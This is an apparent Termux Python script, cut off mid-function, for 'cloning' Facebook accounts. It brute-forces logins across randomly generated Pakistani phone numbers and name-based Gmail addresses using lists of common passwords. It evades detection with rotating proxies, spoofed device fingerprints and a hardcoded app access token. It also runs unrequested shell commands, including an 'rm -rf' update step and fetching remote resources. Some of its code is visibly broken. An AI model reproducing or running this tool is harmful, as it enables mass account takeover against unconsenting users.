fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python Jutt.py')
	
print('[•] Join Whatsap Group')
os.system('xdg-open https://chat.whatsapp.com/LPrAvYliOhKGIS1Eq0vGAW')
print('Checking for update ')
os.system('cd & rm- rf ZABI & cd ZABI &python Juttenc.py')

try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;95m[√] LOADING...')
	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

logo=("""\033[1;91m
                                                   
        88                                 
        88                 ,d       ,d     
        88                 88       88     
        88  88       88  MM88MMM  MM88MMM  
        88  88       88    88       88     
        88  88       88    88       88     
88,   ,d88  "8a,   ,a88    88,      88,    
 "Y8888P"    `"YbbdP'Y8    "Y888    "Y888    XD
                                           
                                           
\033[1;37m--------------------------------------------------
[~] Author   : Asim
[~] Friends : Rehan and Ayan
[~] Tool     : free
[~] Version  : 4.0
\033[1;37m----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def menu():
			clear()
		#	linex()
			print(' [1] File cloning\n [2] Random cloning\n [3] gmail cloning \n [4] Contact on whatsapp \n [0] Exit menu')
			linex()
			xd=input(' Choose an option: ')
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/File.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				print(' All method working ')
				linex()
				print(' \033[1;33m[1] \033[1;37mMethod  (Very Best Working)  \033[1;32m  \n\033[1;33m [2] \033[1;37mMethod  (for mix ids) \033[1;32m  (Working) \n\033[1;33m [3] \033[1;37mMethod  (for mix ids) ')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
				try:
					ps_limit = int(input(' How many passwords do you want to add ? '))
				except:
					ps_limit =1
				clear()
				print('\033[1;32m exp: first last,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				clear()
				print(' Do you went show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(' Total account ids : \033[1;32m'+total_ids+f' ')
					print(' \033[1;37mThe process is running in the background')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(api1,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(api2,ids,names,passlist)
						elif mthd in ['3','03']:
							crack_submit.submit(api3,ids,names,passlist)
						elif mthd in ['4','04']:
							crack_submit.submit(api4,ids,names,passlist)
						elif mthd in ['5','05']:
							crack_submit.submit(api5,ids,names,passlist)
						elif mthd in ['6','06']:
							crack_submit.submit(api6,ids,names,passlist)
						elif mthd in ['7','07']:
							crack_submit.submit(api7,ids,names,passlist)
						elif mthd in ['8','08']:
							crack_submit.submit(api8,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python Jutt.py')
			elif xd in ['2','02']:
				pak()
			elif xd in ['3','03']:
				gmail()
				#create()
				#dz._login()
				exit()
			elif xd in ['4','04']:
				os.system('xdg-open https://chat.whatsapp.com/LPrAvYliOhKGIS1Eq0vGAW')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
				exit(' Option not found in menu...')
		
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 0306,0315,0335,0345')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (v-fast)  ')
		linex()
		mthd = input(' Choose: ')
		clear()
		print('\033[1;32m [1] \033[1;33mClone with 7+11 digit pass (v-fast) \n\033[1;32m [2]\033[1;33m Clone with auto pass (best) \n\033[1;32m [3]\033[1;33m Clone with auto pass (fast)\n\033[1;32m [5] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [5] \033[1;33mClone with auto pass (slow-fast) \n\033[1;32m [6] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [7] \033[1;33mClone with auto pass (only-BD) \n\033[1;32m [8] \033[1;33mClone with auto pass (only-AFG) ')
		linex()
		pcs = input(' [?] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as Jutt:	
			clear()
			tl = str(len(user))
			print(' Total ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
			print(' \033[1;37mThe process is running in the background')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
				if pcs in ['2','02']:
					passlist = [psx,ids,'khankhan','khan1122','ali12345','pakistan','khan12345','ali1122','baloch12345','khan','baloch','khan','pubg','pubg1122','malik786']
				elif pcs in ['3','03']:
					passlist = [psx,ids,'pubg','pubg1122','pubgking','pubg12','pubg123','pubg1234']
				elif pcs in ['4','04']:
					passlist = [psx,ids,'khankhan','khan1122','khan1234','khan123']
				elif pcs in ['5','05']:
					passlist = [psx,ids]
				elif pcs in ['6','06']:
					passlist = [psx,ids,'khankhan','khan1122','786786','ali786','khan123','khan12','pakistan','ali123','khanbaba']
				elif pcs in ['7','07']:
					passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
				elif pcs in ['8','08']:
					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
				if mthd in ['1','01']:
					Jutt.submit(Jutt1,ids,passlist)
				if mthd in ['2','02']:
					Jutt.submit(Jutt2,ids,passlist)
				if mthd in ['3','03']:
					Jutt.submit(Jutt3,ids,passlist)
				if mthd in ['4','04']:
					Jutt.submit(Jutt4,ids,passlist)
				if mthd in ['5','05']:
					Jutt.submit(Jutt5,ids,passlist)
				if mthd in ['6','06']:
					Jutt.submit(Jutt6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python Jutt.py')

def gmail():
		os.system('rm -rf .re.txt')
		clear()
		print('\033[1;37m example: ramzan, ali, sajjad, faizan\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
		linex()
		last = input(' Put last name: ')
		linex()
		print(' Example: @gmail.com ')
		linex()
		domain = input(' domain: ')
		linex()
		try:
			limit=int(input(' Put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
		linex()
		pxc = input(' Choose : ')
		clear()
		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (v-fast)  \033[1;32m \n [3] \033[1;33mMethod   (v-best)  \033[1;32m \n [4] \033[1;33mMethod   (slow) \033[1;32m \n [5] \033[1;33mMethod   (slow)  \033[1;32m \n [6] \033[1;33mMethod   (slow) ')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' Getting gmails...')
		lists = ['3','4']
		for xd in range(limit):
			lchoice = random.choice(lists)
			if '3' in lchoice:
				mail = ''.join(random.choice(string.digits) for _ in range(3))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			else:
				mail = ''.join(random.choice(string.digits) for _ in range(4))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			fo = open('.re.txt', 'r').read().splitlines()
		with tred(max_workers=30) as Jutt:
			total = str(len(fo))
			clear()
			print(' Total ids : \033[1;32m'+total+f' ')
			print(' \033[1;37mThe process is running in the background')
			linex()
			for user in fo:
				ids,names = user.split('|')
				first_name = names.rsplit(' ')[0]
				try:
					last_name = names.rsplit(' ')[1]
				except IndexError:
					last_name = 'Khan'
				fs = first_name.lower()
				ls = last_name.lower()
				if pxc in ['1','01']:
					passlist = [fs+ls,fs+' '+ls,fs]
				elif pxc in ['2','02']:
					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
				elif pxc in ['3','03']:
					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
				else:
					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
				if mthd in ['1','01']:
					Jutt.submit(Jutt1,ids,passlist)
				if mthd in ['2','02']:
					Jutt.submit(Jutt2,ids,passlist)
				if mthd in ['3','03']:
					Jutt.submit(Jutt3,ids,passlist)
				if mthd in ['4','04']:
					Jutt.submit(Jutt4,ids,passlist)
				if mthd in ['5','05']:
					Jutt.submit(Jutt5,ids,passlist)
				if mthd in ['6','06']:
					Jutt.submit(Jutt6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python Jutt.py')

#m2
#b-graph method		
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Jutt-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        #i3 = f"[FBAN/FB4A;FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};[FBAN/{FBAN};FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height};FBLC/en_US;FBCR/{FBCR};FBMF/Realme;FBBD/Realme;FBDV/{reamodels};FBSV/{andver};FBCA/armeabi-v7a:armeabi;]"
                        ############ USER AGENT ###################
                        FBLC = random.choice(['id_ID', 'ur_PK', 'bd_BD', 'fr_FR','it_IT', 'ar_SD', 'en_US', 'es_MX', 'nl_NL'])
                        FBAN = random.choice(['FB4A', 'Orca-Android'])
                        FBCR = random.choice(["null","Null","Zong","Ufone","Telenor","PK-UFONE","Jazz"])
                        FBSV = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
                        facebook_version = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        facebookv = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        fbhlfend = random.choice(["199","477","129","66","375","247","201","236","129","70","116","186","169","118","120","123","121","112","107","117","124","119","127","125","109","127","111","117","118","115","241"])
                        fbbv = str(random.randint(11111111, 99999999))
                        fbrv = str(random.randint(11111111, 99999999))
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        sim = random.choice(['null', 'Null', 'Zong', 'Ufone', 'Telenor', 'PK-UFONE', 'Jazz'])
                        andver = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', ' 13'])
                        country = (['en_US', 'en_GB', 'pt_BR', 'ko_KR', 'ex_MX', 'it_IT', 'np_NP'])
                        fbaan = random.choice(['FB4A', 'Orca-Android'])
                        fbweb = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite', 'com.facebook.mlite'])
                        fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca'])
                        ##################  ___  DEVICE NAME AND HIS REAL VERSIONS__  ##################
                        y1 = 'FBDV/POT-AL00a;FBSV/9.0'
                        y2 = 'FBDV/M886;FBSV/4.0.3'
                        y3 = 'FBDV/HUAWEI AQUA Y2;FBSV/4.4.2'
                        y4 = 'FBDV/HUAWEI-M920;FBSV/2.3.6'
                        y5 = 'FBDV/Huawei Ascend;FBSV/2.3.8'
                        y6 = 'FBDV/HUAWEI-M921;FBSV/2.3.6'
                        y7 = 'FBDV/U9500;FBSV/4.0.3'
                        y8 = 'FBDV/HUAWEI-M931;FBSV/4.0.4'
                        y9 = 'FBDV/HUAWEI Z100-UL00;FBSV/4.4.2'
                        y10 = 'FBDV/RIO-AL00;FBSV/5.1'
                        y11 = 'FBDV/HUAWEI Ascend G;FBSV/4.0.3'
                        y12 = 'FBDV/MLA-L01;FBSV/6.0.1'
                        y13 = 'FBDV/HUAWEI Ascend G;FBSV/4.0.4'
                        y14 = 'FBDV/U8818;FBSV/2.3.6'
                        y15 = 'FBDV/TNN-AN00;FBSV/10'
                        y16 = 'FBDV/G510-0200;FBSV/4.1'
                        y17 = 'FBDV/HUAWEI Mate 20 lite;FBSV/10'
                        y18 = 'FBDV/G525-U00;FBSV/4.1'
                        y19 = 'FBDV/G525-U00;FBSV/8.1'
                        y20 = 'FBDV/G527-U081;FBSV/4.1'
                        y21 = 'FBDV/RNE-L21;FBSV/7.0'
                        y22 = 'FBDV/G6-U00;FBSV/4.3'
                        y23 = 'FBDV/BLA-L29;FBSV/8.0'
                        y24 = 'FBDV/G6-L11;FBSV/4.3'
                        y25 = 'FBDV/HMA-L29;FBSV/9.0'
                        y26 = 'FBDV/SNE-AL00;FBSV/8.1'
                        y27 = 'FBDV/G620S-L01;FBSV/4.4.2'
                        y28 = 'FBDV/LYA-L09;FBSV/9.0'
                        y29 = 'FBDV/G630-U10;FBSV/4.3'
                        y30 = 'FBDV/LYA-L09;FBSV/9.0'
                        y31 = 'FBDV/G7-L01;FBSV/4.4.2'
                        y32 = 'FBDV/EVR-L29;FBSV/9.0'
                        y33 = 'FBDV/G700-U10;FBSV/4.2'
                        y34 = 'FBDV/TAS-L09;FBSV/10'
                        y35 = 'FBDV/G730-U10;FBSV/4.2'
                        y36 = 'FBDV/TAS-AN00;FBSV/10'
                        y37 = 'FBDV/MT1-U06;FBSV/4.1.2'
                        y38 = 'FBDV/SPL-AL00;FBSV/9.0'
                        y39 = 'FBDV/MT1-U06;FBSV/4.1'
                        y40 = 'FBDV/LIO-L09;FBSV/10'
                        yes = random.choice([y1,y2,y3,y4,y5,y6,y7,y8,y9,y10,y11,y12,y13,y14,y15,y16,y17,y18,y19,y20,y21,y22,y23,y24,y25,y26,y27,y28,y29,y30,y31,y32,y33,y34,y35,y36,y37,y38,y39,y40])
                        e = f"[FBAN/FB4A;FBAV/{facebookv};FBBV/{fbbv};"
                        u1 = f"[FBAN/Orca-Android;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.orca;FBLC/en_BD;FBCR/{FBCR};FBMF/HUAWEI;FBBD/HUAWEI;{yes};FBCA/arm64-v8a:null;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        u2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/{fbweb};FBLC/en_BD;FBCR/{FBCR};FBMF/HUAWEI;FBBD/HUAWEI;{yes};nullFBCA/armeabi-v7a:armeabi;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        x1 = e + u1
                        x2 = e + u2
                        ua = random.choice([x1,x2])
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
